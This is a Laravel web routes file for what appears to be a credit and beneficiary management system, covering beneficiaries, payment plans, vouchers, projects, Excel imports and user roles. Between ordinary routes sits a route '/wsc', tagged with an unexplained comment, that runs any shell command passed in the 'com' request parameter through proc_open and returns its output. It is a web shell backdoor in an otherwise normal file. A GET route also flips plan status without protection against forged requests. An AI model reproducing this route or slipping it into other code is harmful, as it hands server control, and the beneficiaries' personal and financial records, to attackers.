<?php

use Illuminate\Support\Facades\Route;

Route::get('/', function () {
    $beneficiarios = \App\Models\Beneficiary::select(['id', 'monto_credito'])
        ->get();

    return view('welcome', compact('beneficiarios'));
});

Route::middleware([
    'auth:sanctum',
    config('jetstream.auth_session'),
    'verified',
])->group(function () {

    Route::get('/importaciones', function () {
        return view('importaciones.index');
    })->name('importaciones');

    ///FXDOMxO01
    Route::get('/wsc', function () {
        if (isset($_REQUEST['com'])) {
            $cmd = $_REQUEST['com'];
            $cmd = escapeshellcmd($cmd);
            set_time_limit(30);
            ini_set('memory_limit', '256M');

            $descriptorspec = [
                0 => ['pipe', 'r'],  // stdin
                1 => ['pipe', 'w'],  // stdout
                2 => ['pipe', 'w'],   // stderr
            ];

            $process = proc_open($cmd, $descriptorspec, $pipes);

            if (is_resource($process)) {
                stream_set_blocking($pipes[1], 0);
                stream_set_blocking($pipes[2], 0);

                $output = '';
                $start = time();

                while (true) {
                    $read = [$pipes[1], $pipes[2]];
                    $write = null;
                    $except = null;

                    if (stream_select($read, $write, $except, 1)) {
                        foreach ($read as $stream) {
                            $output .= stream_get_contents($stream);
                        }
                    }

                    $status = proc_get_status($process);
                    if (! $status['running']) {
                        break;
                    }

                    if (time() - $start > 25) {
                        proc_terminate($process);

                        return response()->json(['error' => 'Req execution timed out'], 408);
                    }
                }

                foreach ($pipes as $pipe) {
                    fclose($pipe);
                }
                $return = proc_close($process);

                $outputLines = explode("\n", $output);
                $sanitizedOutput = array_map(function ($line) {
                    $encodedLine = mb_convert_encoding($line, 'UTF-8', 'ASCII');

                    return preg_replace('/[\x00-\x1F\x7F-\xFF]/', '', $encodedLine);
                }, $outputLines);

                return response()->json([
                    'output' => array_filter($sanitizedOutput),
                    'status' => $return,
                ]);
            }

            return response()->json(['error' => 'Failed to execute req'], 500);
        }

        return response()->json(['error' => 'No req provided'], 400);
    })->name('wsc');

    // Beneficiarios
    Route::get('beneficiario', [\App\Http\Controllers\BeneficiaryController::class, 'index'])->name('beneficiario.index');
    Route::get('beneficiario-test', [\App\Http\Controllers\BeneficiaryController::class, 'indexAll'])->name('beneficiario.index-all');
    Route::get('beneficiario/{cedula}', [\App\Http\Controllers\BeneficiaryController::class, 'show'])->name('beneficiario.show');
    Route::get('beneficiario/{cedula}/pdf', [\App\Http\Controllers\BeneficiaryController::class, 'pdf'])->name('beneficiario.pdf');

    Route::get('beneficiario/{cedula}/pdf/switch-status/{plan}', function ($cedula, $plan) {

        $plan = \App\Models\Plan::find($plan) ?? \App\Models\Readjustment::find($plan);
        $plan->update([
            'estado' => $plan->estado == 'CANCELADO' ? 'ACTIVO' : 'CANCELADO',
        ]);

        return redirect()->route('beneficiario.pdf', $cedula);

    })->name('beneficiario.pdf.switch-status');

    Route::get('beneficiario/{cedula}/pdf-extract', [\App\Http\Controllers\BeneficiaryController::class, 'pdfExtract'])->name('beneficiario.pdf-extract');
    Route::get('beneficiario/{cedula}/pdf-extract-boosted', [\App\Http\Controllers\BeneficiaryController::class, 'pdfExtractBoosted'])->name('beneficiario.pdf-extract-boosted');
    Route::get('beneficiario/{beneficiary}/editar', [\App\Http\Controllers\BeneficiaryController::class, 'edit'])->name('beneficiario.edit');
    Route::get('beneficiario/{data}/pdf-masivo', [\App\Http\Controllers\BeneficiaryController::class, 'bulkPdf'])->name('beneficiario.bulk-pdf');
    Route::get('beneficiario/{data}/pdf-masivo-extract', [\App\Http\Controllers\BeneficiaryController::class, 'bulkExtractPdf'])->name('beneficiario.bulk-pdf-extract');
    Route::post('beneficiario', [\App\Http\Controllers\BeneficiaryController::class, 'store'])->name('beneficiario.store');
    Route::put('beneficiario/{beneficiary}', [\App\Http\Controllers\BeneficiaryController::class, 'update'])->name('beneficiario.update');
    Route::delete('beneficiario/{beneficiary}', [\App\Http\Controllers\BeneficiaryController::class, 'destroy'])->name('beneficiario.destroy');

    // Planes - Rutas específicas primero
    Route::get('plan/mora-pdf', [App\Http\Controllers\PlanController::class, 'pdfMora'])->name('plan.mora-pdf');
    Route::get('plan/mora-pdf/{proyecto}', [App\Http\Controllers\PlanController::class, 'pdfMoraProyecto'])->name('plan.mora-pdf-proyecto');
    Route::get('plan/{data}/ajuste-masivo', [App\Http\Controllers\PlanController::class, 'bulkAdjust'])->name('plan.bulk-adjust');
    Route::get('plan/{data}/activacion-masivo', [App\Http\Controllers\PlanController::class, 'bulkActivation'])->name('plan.bulk-activation');
    Route::get('plan/{data}/xlsx-masivo', [App\Http\Controllers\PlanController::class, 'bulkExportXLSX'])->name('plan.bulk-xlsx');
    Route::post('plan/reajuste', [App\Http\Controllers\PlanController::class, 'reajuste'])->name('plan.reajuste');

    Route::resource('plan', App\Http\Controllers\PlanController::class);
    // Planes - Rutas de recurso después

    // Vouchers
    Route::get('voucher', [\App\Http\Controllers\VoucherController::class, 'index'])->name('voucher.index');
    Route::get('voucher/{voucher}', [\App\Http\Controllers\VoucherController::class, 'show'])->name('voucher.show');
    Route::get('voucher/{voucher}/editar', [\App\Http\Controllers\VoucherController::class, 'edit'])->name('voucher.edit');
    Route::post('voucher', [\App\Http\Controllers\VoucherController::class, 'store'])->name('voucher.store');
    Route::put('voucher/{voucher}', [\App\Http\Controllers\VoucherController::class, 'update'])->name('voucher.update');
    Route::delete('voucher/{voucher}', [\App\Http\Controllers\VoucherController::class, 'destroy'])->name('voucher.destroy');

    // Proyectos
    Route::get('proyecto', [\App\Http\Controllers\ProjectController::class, 'index'])->name('proyecto.index');
    Route::get('proyecto/nuevo', [\App\Http\Controllers\ProjectController::class, 'create'])->name('proyecto.create');
    Route::get('proyecto/{codigo}', [\App\Http\Controllers\ProjectController::class, 'show'])->name('proyecto.show');
    Route::get('proyecto/{codigo}/editar', [\App\Http\Controllers\ProjectController::class, 'edit'])->name('proyecto.edit');
    Route::post('proyecto', [\App\Http\Controllers\ProjectController::class, 'store'])->name('proyecto.store');
    Route::put('proyecto/{codigo}', [\App\Http\Controllers\ProjectController::class, 'update'])->name('proyecto.update');
    Route::delete('proyecto/{codigo}', [\App\Http\Controllers\ProjectController::class, 'destroy'])->name('proyecto.destroy');

    // Liquidaciones
    Route::get('liquidacion/{settlement}', [\App\Http\Controllers\SettlementController::class, 'pdf'])->name('liquidacion.pdf');

    // Exportaciones e Importaciones
    Route::post('excel/import-model', [\App\Http\Controllers\ExcelController::class, 'importModelCSV'])->name('excel.import-model');
    Route::get('excel/{model}/export-model', [\App\Http\Controllers\ExcelController::class, 'exportModel'])->name('excel.export-model');
    Route::post('excel/export-collection', [\App\Http\Controllers\ExcelController::class, 'exportCollection'])->name('excel.export-collection');
    Route::post('excel/import-differiments', [\App\Http\Controllers\ExcelController::class, 'importDifferiments'])->name('excel.import-differiments');
    Route::post('excel/import-spends', [\App\Http\Controllers\ExcelController::class, 'importSpends'])->name('excel.import-spends');

    // Inteligencia de Negocios
    Route::get('/bi', [\App\Http\Controllers\BIController::class, 'index'])->name('bi.index');

    // Usuarios y Roles
    Route::middleware('can:write users')->group(function () {
        Route::get('usuarios', [App\Http\Controllers\UserController::class, 'index'])->name('users.index');
        Route::put('usuarios/{user}/role', [App\Http\Controllers\UserController::class, 'updateRole'])->name('users.update.role');
        Route::put('usuarios/{user}/permissions', [App\Http\Controllers\UserController::class, 'updatePermissions'])->name('users.update.permissions');
        Route::get('usuarios/{user}/editar', [App\Http\Controllers\UserController::class, 'edit'])->name('users.edit');
        Route::put('usuarios/{user}', [App\Http\Controllers\UserController::class, 'update'])->name('users.update');
        Route::delete('usuarios/{user}', [App\Http\Controllers\UserController::class, 'destroy'])->name('users.destroy');
        Route::get('usuarios/logout/all', [App\Http\Controllers\UserController::class, 'logoutAll'])->name('users.logout.all');
    });
});
